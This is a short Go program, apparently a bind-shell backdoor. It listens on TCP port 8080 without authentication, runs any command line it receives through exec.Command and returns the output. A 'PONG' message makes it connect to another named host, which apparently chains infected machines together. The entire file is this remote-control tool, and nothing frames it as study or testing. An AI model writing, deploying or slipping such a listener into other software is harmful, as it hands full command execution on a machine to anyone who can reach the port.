package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

const (
	connPort = ":8080"
	connType = "tcp"
)

func establishConnection(ln net.Listener) net.Conn {
	var conn net.Conn
	var err error
	for {
		conn, err = ln.Accept()
		if err != nil {
			continue
		}
		break
	}
	return conn
}

func main() {
	var ln net.Listener
	var err error
	for {
		ln, err = net.Listen(connType, connPort)
		if err != nil {
			fmt.Println("Error listening")
		}else {
			break
		}
	}
	for {
		conn := establishConnection(ln)
		for {
			message, _ := bufio.NewReader(conn).ReadString('\n')
			message = strings.TrimSuffix(message, "\n")
			command := strings.Fields(message)
			var out []byte
			var reply string
			if len(command) == 0{
				continue
			}
			if command[0] == "exit" {
				break
			} else if command[0] == "PONG" {
				if len(command) >= 2 {
					fmt.Fprintf(conn, "Creating new connection\n")
					conn, err := net.Dial(connType, command[1]+connPort)
					if err != nil {
						break
					}
					fmt.Fprintf(conn, "PING\n")
				}
				reply = "PING"
			} else if command[0] == "PING" {
				reply = "PONG"
			}else if len(command) == 1 {
				out, _ = exec.Command(command[0]).Output()
				reply = string(out[:])
			} else if len(command) > 1 {
				args := command[1:]
				out, _ = exec.Command(command[0], args[:]...).Output()
				reply = string(out[:])
			}
			fmt.Fprintf(conn, reply+"\n")
		}
	}

}